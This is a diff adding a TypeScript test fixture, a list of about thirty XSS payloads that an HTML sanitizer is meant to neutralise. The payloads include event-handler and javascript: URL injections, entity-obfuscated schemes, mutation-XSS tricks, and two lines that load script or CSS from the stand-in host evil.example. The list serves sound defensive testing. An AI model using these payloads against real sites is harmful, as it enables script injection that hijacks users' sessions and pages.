@@ -1,0 +1,36 @@
+/**
+ * XSS payloads (docs/SPEC.md NFR-2). After sanitization none of them may leave a script, an
+ * event handler or a dangerous URL in the DOM.
+ */
+export const XSS_VECTORS: readonly string[] = [
+  '<script>alert(1)</script>',
+  '<p>a<script src="https://evil.example/x.js"></script></p>',
+  '<img src="x" onerror="alert(1)">',
+  '<IMG SRC="x" ONERROR="alert(1)">',
+  '<svg onload="alert(1)"><circle r="1"></circle></svg>',
+  '<details open ontoggle="alert(1)">x</details>',
+  '<div onclick="alert(1)">x</div>',
+  '<a href="#" onmouseover="alert(1)">x</a>',
+  '<a href="javascript:alert(1)">x</a>',
+  '<a href=" JaVaScRiPt:alert(1)">x</a>',
+  '<a href="java&#9;script:alert(1)">x</a>',
+  '<a href="java&#10;script:alert(1)">x</a>',
+  '<a href="&#1;javascript:alert(1)">x</a>',
+  '<a href="&#106;avascript:alert(1)">x</a>',
+  '<a href="vbscript:msgbox(1)">x</a>',
+  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
+  '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
+  '<img src="javascript:alert(1)">',
+  '<iframe src="javascript:alert(1)"></iframe>',
+  '<object data="javascript:alert(1)"></object>',
+  '<embed src="javascript:alert(1)">',
+  '<form action="javascript:alert(1)"><button>x</button></form>',
+  '<base href="javascript:/">',
+  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
+  '<style>@import "https://evil.example/x.css";</style>',
+  '<p style="background-image: url(javascript:alert(1))">x</p>',
+  '<span style="color: expression(alert(1))">x</span>',
+  '<span style="font-family: x;} body { background: url(x)">x</span>',
+  '<math><mtext><table><mglyph><style><img src="x" onerror="alert(1)">',
+  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
+];
